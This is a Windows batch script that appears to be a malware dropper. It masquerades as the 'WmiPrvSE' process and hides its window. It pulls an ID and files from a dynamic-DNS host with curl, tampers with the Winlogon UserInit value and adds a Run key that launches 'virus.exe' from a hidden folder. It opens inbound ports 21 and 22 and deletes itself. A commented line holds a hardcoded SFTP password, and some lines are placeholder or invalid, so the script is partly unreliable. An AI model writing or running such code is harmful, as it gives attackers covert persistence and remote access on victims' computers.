@echo off
title WmiPrvSE
nircmd.exe win hide ititle "WmiPrvSE"
curl cloud-winsock-adapter.ddns.net/id-assoc>tmp
set /p id=< tmp
#83BEAFFF-F3C0-CCCC-8666-787E7E4748C3
REG ADD "HKLM\SOFTWARE\Microsoft\Print\Extend"
REG ADD "HKLM\SOFTWARE\Microsoft\Print\Extend" /v "id-assoc" /t REG_SZ /d "{%id%}"
REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v "UserInit" /d "C:\WINDOWS\system32\notepad.exe,C:\Windows\system32\userinit.exe"
#for /f "tokens=2*" %%a in ('reg query HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v EnableFirewall') do set "var=%%b"
if "%var%"=="0x1" (do this) else do that

netsh advfirewall firewall add rule name="Under Supervision" dir=in action=allow protocol=TCP localport=21
netsh advfirewall firewall add rule name="Under Supervision" dir=in action=allow protocol=TCP localport=22
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WinAPI /t REG_SZ /d %APPDATA%\Microsoft\Windows\Security\lpt9\virus.exe /f
cd %APPDATA%\Microsoft\Windows
mkdir Security
attrib +h +s +a Security
cd Security
curl cloud-winsock-adapter.ddns.net/
#:md lpt9\ 
#mkdir lpt9
echo get virus.exe>script.txt
#psftp -b script.txt pi@myhubs.ddns.net -pw lafr30129109 -P 6666
#del script.txt
#copy virus.exe > lpt9\virus.exe
del "%~f0"